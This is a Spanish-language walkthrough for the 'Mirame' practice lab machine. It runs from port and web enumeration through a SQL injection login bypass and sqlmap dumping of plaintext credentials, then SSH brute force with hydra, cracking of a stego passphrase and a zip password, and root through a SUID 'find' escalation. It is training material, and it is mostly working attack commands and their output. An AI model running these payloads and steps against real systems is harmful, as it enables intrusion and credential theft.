
- Tags: #Mirame
---
[Maquina Mirame](https://mega.nz/file/ESlzWRgK#AH1gfCknG0G8uS86qrQTAu_CssdG_2Vidvx0UePPTm0) -> Enlace de descarga al laboratorio
```bash
7z x mirame.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh mirame.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Realizamos una traza ICMP para determinar si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-10000 # Usamos nuestra herramienta en python
nmap -p- -sS --open --min-rate 5000 -vvv -n -P 172.17.0.2 -oG allPorts # Realizamos deteccion de puertos en el target
extractPorts allPorts # Parseamos la infomacion mas relevante del primer escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar los servicios y las versiones.
```

**( 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) )** -> Detectamos un servicio **ssh** expuesto

### Fase Enumeracion Web:
**( 80/tcp open  http    Apache httpd 2.4.61 ((Debian)) )** -> Tenemos un servicio web expuesto:  **( debianSid )**
```bash
whatweb http://172.17.0.2 # Realizamos deteccion de las tecnologias empleadas por la web
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,txt,css,html,js # Enumeracion de archivos

# Resultado
/index.php            (Status: 200) [Size: 2351]
/page.php             (Status: 200) [Size: 2169]
/auth.php             (Status: 200) [Size: 1852]
```

**( http://172.17.0.2/page.php )** -> Nos lleva a esta pagina en la que podemos consultar el clima por ciudad,
**Nota** --> Probamos de todo tipo de inyecciones, Escape de comandos pero no logramos detectar nada.

**( http://172.17.0.2/index.php )** --> Tenemos un panel de autentificacion el cual es vulnerable a inyeccion SQL basada en tiempo:

```bash
admin' # logramos romper la query SQL provocando el error
admin' or 1=1-- - # Ganamos acceso sin proporcionar password
```

```bash
sqlmap --url http://172.17.0.2/index.php --dbs --form --batch # Lazamos el primer escaneo.

#Resultado
[16:32:32] [INFO] resumed: 'users'
```

```bash
sqlmap --url http://172.17.0.2/index.php --forms -D users --tables --batch # Enumeramos las tablas 

# Resultado
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

```bash
sqlmap --url http://172.17.0.2/index.php --forms -D users -T usuarios --dump --batch # Dumpeamos la bd

# Resultado
+----+------------------------+------------+
| id | password               | username   |
+----+------------------------+------------+
| 1  | chocolateadministrador | admin      |
| 2  | lucas                  | lucas      |
| 3  | soyagustin123          | agustin    |
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+
```

**Nota** -> Crearemos un archivo **( users.txt )** que contenga los nombres de usuario para poder aplicar fuerza bruta por ssh.
```bash
admin     
lucas     
agustin   
directorio
```

**Nota** -> El resultado nos indica que no existe ningun usuario valido para los diccionarios que aplicamos
```bash
nmap -p 22 --script ssh-brute --script-args userdb=users.txt 172.17.0.2 # Aplicamos fuerza bruta con Nmap, En caso de que no encontremos nada usaremos Hydra
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 64 ssh://172.17.0.2 # Aplicamos fuerza bruta con hydra
```

```bash
gobuster dir -u http://172.17.0.2/ -w users.txt -x html,css,js,txt,py,php,php.back # Aplicamos fuzzing con los nombres de usuario pero no obtuvimos nada
```

```bash
gobuster dir -u http://172.17.0.2/ -w passwords.txt -x html,css,js,txt,py,php,php.back # Aplicamos fuzzing con las passwords de los usuarios.

# Resultado
/directoriotravieso   (Status: 301) [Size: 321] [--> http://172.17.0.2/directoriotravieso/] # Tenemos un nuevo directorio
```

```bash
http://172.17.0.2/directoriotravieso/miramebien.jpg # Nos descargaremos esta imagen para analizarla.

binwalk miramebien.jpg # Buscamos cabeceras o archivos incrustados.
strings miramebien.jpg # No obtuvimos cadenas legibles
exiftool miramebien.jpg # En los metadatos no encontramos nada.
```

```bash
steghide info miramebien.jpg # No reporta nada, Ya que necesitamos el passphrase para obtener la info

stegseek --crack miramebien.jpg # Aplicamos fuerza bruta para obtener el passphrase
# Resultado
[i] Found passphrase: "chocolate"
[i] Original filename: "ocultito.zip".
```

```bash
steghide extract -sf miramebien.jpg # Ingresamos el passphrase ( chocolate )

# Resultado
anot� los datos extra�dos e/"ocultito.zip"
```

```bash
7z x ocultito.zip # Para descomprimir y obtener el archivo nos pide una password que no sabemos, Asi que tendremos que aplicar fuerza bruta.
```

```bash
zip2john ocultito.zip > archivo_oculto
john --wordlist=/usr/share/wordlists/rockyou.txt archivo_oculto # Aplicamos fuerza bruta

stupid1          (ocultito.zip/secret.txt) # Resultado.
```

```bash
7z x ocultito.zip # Ingresamos la password: ( stupid1 )
secret.txt # Resultado obtenido
```

```bas
cat secret.txt

carlos:carlitos # Tenemos un potencial usuario que intentaremos usar en ssh
```

### Fase Instrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh carlos@172.17.0.2 # Colocamos de password: ( carlitos )
```

### Fase Escalada Privilegios:
```bash
find / -perm -4000 2>/dev/null # Tenemos un binario potencial para elevar privilegios
```

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit # Ahora obtenemos una bash como root.
```

```bash
bash-5.2# whoami
root
```